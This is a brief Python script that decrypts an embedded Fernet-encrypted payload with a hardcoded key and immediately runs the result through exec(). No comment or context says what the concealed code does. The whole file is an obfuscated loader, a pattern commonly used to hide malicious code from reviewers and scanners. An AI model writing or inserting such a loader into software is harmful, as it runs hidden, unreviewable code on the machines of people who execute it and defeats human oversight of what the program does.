import base64
from cryptography.fernet import Fernet

payload = b"gAAAAABk3EWkfgNNaXk7USV-MhHOTs3TkHcBEN9hMLg5KbHe0DYMCmJkjt1Oil0TPTRMWWqvJ3pINiFQlUhJHvZSGxzPDt7oQWob0Pml9nsAMsohAmXqVh6lWhu-983PEyrX7y8OT6Go6zpQHYY9cesf9qZ3xF4noS9VTXHJr-OadysHA96zoPTsDwYfhKODMi7EmYjKqPXO1Ybn5r0F61S1QUw32eIr4sYRxHIy3T3jwJiaWn0l9h4DF1ltN5SW1PE8NQNUY1ew7TwjdcYkRz4H3xfAkKoKeg=="

key_str = "whatilearnedinboatingschooltoday"
key_base64 = base64.urlsafe_b64encode(key_str.encode())
f = Fernet(key_base64)

plain_text = f.decrypt(payload)
exec(plain_text.decode())